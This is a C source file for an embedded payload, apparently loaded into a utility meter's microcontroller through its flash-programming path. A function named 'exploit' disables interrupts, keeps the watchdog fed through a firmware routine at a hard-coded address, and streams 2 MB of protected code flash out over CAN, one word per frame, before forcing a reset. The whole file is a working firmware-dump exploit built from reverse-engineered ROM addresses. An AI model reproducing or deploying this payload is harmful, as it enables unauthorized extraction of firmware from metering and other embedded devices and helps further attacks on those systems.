/*
 * Read-only CodeFlash payload for r4p-838004AD91.
 * Entry inherits the RPRG stack, GP/TP and initialized RSCAN channel 2.
 * The firmware's WDTA service at FEDC1D7E uses its 0x5F mode (100% window)
 * and handles both fixed and variable activation codes.
 * Reset through the meter's own protected SWRESA sequence at 0xAD4.
 *
 * ROM CDFC TX records select channel 2, buffer 2 for 7C8. ROM CFB4
 * channel pointers give TMC=FFD00270, TMSTS=FFD002F0, TM=FFD01200.
 * 4FC0/FEDC3BF0: ready mask 1E, stride 16, DLC<<28, byte request=1.
 * 50C0/FEDC3CF0: result 4 succeeds, 2/6 abort; clear status with zero.
 */
#ifndef DUMP_START
#define DUMP_START 0u
#endif
#ifndef DUMP_LENGTH
#define DUMP_LENGTH 0x00200000u
#endif
#ifndef TX_SPIN_LIMIT
#define TX_SPIN_LIMIT 0x01000000u
#endif
#define REG32(a) (*(volatile unsigned int *)(a))
#define REG8(a) (*(volatile unsigned char *)(a))
#define TMID 0xFFD01220u
#define TMPTR 0xFFD01224u
#define TMDF0 0xFFD01228u
#define TMDF1 0xFFD0122Cu
#define TMC 0xFFD00272u
#define TMSTS 0xFFD002F2u

static void send_frame(unsigned int word0, unsigned int word1)
    __attribute__((noinline));
static void terminal_reset(unsigned int reason)
    __attribute__((noinline, noreturn));

static void feed_watchdog(void);

/* First function plus -fno-toplevel-reorder keeps entry at load address. */
unsigned int exploit(unsigned int mode) {
  unsigned int address;
  unsigned int count = 0u;
  if (mode != 1u)
    return 1u;
  asm volatile("di");
  feed_watchdog();
  /* Operation mode and a retained standard diagnostic response element. */
  if ((REG32(0xFFD0008Cu) & 7u) != 0u || (REG32(0xFFD00028u) & 7u) != 0u ||
      REG32(TMID) != 0x7C8u)
    terminal_reset(4u);
  send_frame(0xD00D0001u, 1u);
  send_frame(0xD00D0002u, DUMP_START);
  send_frame(0xD00D0003u, DUMP_LENGTH);
  send_frame(0xD00D0004u, DUMP_LENGTH / 4u);
  for (address = DUMP_START; address < DUMP_START + DUMP_LENGTH;
       address += 4u) {
    send_frame(address, REG32(address));
    count++;
    if ((count & 0xFFFu) == 0u)
      send_frame(0xD00D0010u, address + 4u);
  }
  send_frame(0xD00D00FFu, count);
  terminal_reset(0u);
}

static void feed_watchdog(void) { ((void (*)(void))0xFEDC1D7Eu)(); }

/* Never return success into the stock erase-driver continuation. */
static void terminal_reset(unsigned int reason) {
  asm volatile("" : : "r"(reason) : "memory");
  ((void (*)(void))0x00000AD4u)();
  __builtin_unreachable();
}

static void send_frame(unsigned int word0, unsigned int word1) {
  unsigned int spin;
  unsigned int status;
  for (spin = 0u; spin < TX_SPIN_LIMIT; spin++) {
    if ((spin & 0xFFu) == 0u)
      feed_watchdog();
    if ((REG8(TMSTS) & 0x1Eu) == 0u)
      break;
  }
  if (spin == TX_SPIN_LIMIT)
    terminal_reset(1u);
  REG32(TMID) = 0x7C8u;
  REG32(TMPTR) = 0x80000000u;
  REG32(TMDF0) = word0;
  REG32(TMDF1) = word1;
  asm volatile("syncp" : : : "memory");
  REG8(TMC) = 1u;
  for (spin = 0u; spin < TX_SPIN_LIMIT; spin++) {
    if ((spin & 0xFFu) == 0u)
      feed_watchdog();
    status = REG8(TMSTS) & 6u;
    if (status != 0u) {
      REG8(TMSTS) = 0u;
      asm volatile("syncp" : : : "memory");
      if (status != 4u)
        terminal_reset(3u);
      return;
    }
  }
  terminal_reset(2u);
}
